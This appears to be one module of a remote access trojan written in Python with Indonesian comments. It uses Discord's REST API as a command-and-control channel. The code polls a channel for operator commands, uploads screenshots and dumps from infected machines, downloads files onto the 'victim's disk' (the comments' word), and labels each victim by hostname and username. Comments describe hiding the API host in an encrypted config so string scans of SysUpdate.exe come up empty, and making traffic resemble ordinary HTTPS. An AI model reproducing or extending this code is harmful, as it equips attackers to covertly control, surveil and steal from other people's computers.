"""core/net.py â€” transport Discord lewat REST murni. Tanpa discord.py, tanpa gateway.

Kenapa REST: gateway butuh websocket + aiohttp + intents, bobot 30MB, dan pola
koneksinya jadi signature sendiri. Polling REST cukup requests, 3 detik interval,
kelihatan seperti request HTTPS biasa.
"""

import os
import socket
import time

import requests

from . import config

# Base URL datang dari config terenkripsi. Nggak ada literal host di sini,
# jadi `strings SysUpdate.exe | findstr discord` balik kosong.
API = config.API


def auto_alias(uuid):
    """Alias pendek yang unik per mesin, diturunkan dari nama host.

    Versi lama membekukan alias waktu build (`--alias a`), jadi dua korban di
    channel yang sama sama-sama menjawab `!a` dan nggak ada cara memilih salah
    satu. Sekarang:

        PC-KENTANQ          -> kent
        DESKTOP-HOJVQB2     -> hojv
        DESKTOP-ERMHNZW     -> ermh

    Bagian sesudah tanda hubung diambil karena itu bagian yang beda-beda di
    penamaan Windows. Kalau host kosong atau aneh, jatuh ke uuid.
    """
    try:
        host = socket.gethostname() or ""
    except Exception:
        host = ""
    tail = host.split("-")[-1] if "-" in host else host
    slug = "".join(ch for ch in tail.lower() if ch.isalnum())[:4]
    return slug or (uuid[:4].lower() if uuid else "x")


class Discord:
    def __init__(self, token, channel, uuid, alias=None):
        self.token = token
        self.channel = str(channel)
        self.uuid = uuid
        # Alias dipakai buat prefix balasan di channel, bukan buat routing.
        # Mesin banyak = uuid8 nggak kebaca, [a] jauh lebih cepat dipindai.
        # Alias dari builder cuma dipakai kalau diisi eksplisit.
        self.alias = (alias or "").strip().lower() or auto_alias(uuid)
        # Tiga penanda yang dipakai routing `!@<pola>`: nama host, user, uuid8.
        # Tanpa ini, dua mesin ber-alias sama nggak bisa dipilih satu-satu.
        self.uuid8 = uuid[:8].lower()
        try:
            self.host = (socket.gethostname() or "").lower()
        except Exception:
            self.host = ""
        self.user = (os.getenv("USERNAME") or "").lower()
        self.session = requests.Session()
        # Content-Type sengaja TIDAK di-set di sini: multipart butuh boundary sendiri.
        host = API.split("/")[2]
        self.session.headers.update({
            "Authorization": "Bot " + token,
            "User-Agent": "DiscordBot (https://%s/api, 10)" % host,
        })
        self.me = None
        self.last_id = "0"
        self.backoff = 2

    def call(self, method, path, **kwargs):
        """Retry-on-429 dan retry-on-network. Return Response atau None."""
        url = API + path
        for _ in range(4):
            try:
                r = self.session.request(method, url, timeout=45, **kwargs)
                if r.status_code == 429:
                    wait = 2.0
                    try:
                        wait = float(r.json().get("retry_after", 2.0))
                    except ValueError:
                        pass
                    time.sleep(wait + 0.5)
                    continue
                self.backoff = 2
                return r
            except requests.RequestException:
                time.sleep(self.backoff)
                self.backoff = min(self.backoff * 2, 60)
        return None

    def prime(self):
        """Ambil identitas bot + posisi pesan terakhir. False = token/channel salah."""
        r = self.call("GET", "/users/@me")
        if r is None or not r.ok:
            return False
        self.me = r.json().get("id")
        r = self.call("GET", "/channels/%s/messages?limit=1" % self.channel)
        if r is None or not r.ok:
            return False
        data = r.json()
        # Pesan terakhir jadi titik mulai: jangan eksekusi backlog lama.
        self.last_id = data[0]["id"] if data else "0"
        return True

    def poll(self):
        """Ambil pesan baru sejak last_id. Pesan bot sendiri dibuang.

        Discord mengembalikan batch dari yang TERBARU ke terlama. Versi lama
        menimpa last_id dengan id tiap pesan sesuai urutan baca, jadi yang
        tersimpan justru id TERTUA di batch — dan semua pesan sesudahnya
        diambil ulang di polling berikutnya. Akibatnya satu perintah bisa
        dijawab dua kali. Sekarang id dibandingkan sebagai angka, batch
        dibaca menaik, dan last_id selalu id tertinggi.
        """
        r = self.call("GET", "/channels/%s/messages?limit=20&after=%s" % (
            self.channel, self.last_id))
        if r is None or not r.ok:
            return []
        out = []
        newest = int(self.last_id or 0)
        for msg in reversed(r.json()):
            mid = int(msg["id"])
            if mid <= newest:
                continue
            newest = mid
            if msg.get("author", {}).get("id") == self.me:
                continue
            out.append(msg)
        self.last_id = str(newest)
        return out

    def send(self, text):
        """Kirim teks, dipotong per 1900 char supaya nggak kena limit 2000."""
        text = str(text) if text else "(kosong)"
        for i in range(0, len(text), 1900):
            self.call("POST", "/channels/%s/messages" % self.channel,
                      json={"content": "[%s] %s" % (self.alias, text[i:i + 1900])})
            time.sleep(0.4)

    def send_file(self, path, caption=""):
        """Upload file (screenshot, dump). Multipart, boundary otomatis dari requests."""
        import os
        name = os.path.basename(path)
        with open(path, "rb") as fh:
            self.call("POST", "/channels/%s/messages" % self.channel,
                      files={"file": (name, fh, "application/octet-stream")},
                      data={"content": "[%s] %s" % (self.alias, caption)})

    def fetch(self, url, dest):
        """Tarik file dari attachment URL ke disk korban."""
        r = self.session.get(url, timeout=120, stream=True)
        r.raise_for_status()
        with open(dest, "wb") as fh:
            for chunk in r.iter_content(65536):
                fh.write(chunk)
        return dest

    def purge(self, limit=100):
        """Hapus pesan di channel, mundur dari yang terbaru.

        Pesan bot sendiri selalu bisa dihapus. Pesan user hanya terhapus kalau
        bot punya izin Manage Messages; yang ditolak dihitung sebagai `skip`,
        bukan dianggap sukses — jadi laporannya jujur.
        """
        gone = skip = 0
        before = None
        checked = 0
        while checked < limit:
            path = "/channels/%s/messages?limit=50" % self.channel
            if before:
                path += "&before=%s" % before
            r = self.call("GET", path)
            if r is None or not r.ok:
                break
            batch = r.json()
            if not batch:
                break
            for msg in batch:
                before = msg["id"]
                checked += 1
                d = self.call("DELETE", "/channels/%s/messages/%s" % (self.channel, msg["id"]))
                if d is not None and d.ok:
                    gone += 1
                else:
                    skip += 1
                time.sleep(0.35)
                if checked >= limit:
                    break
        return gone, skip
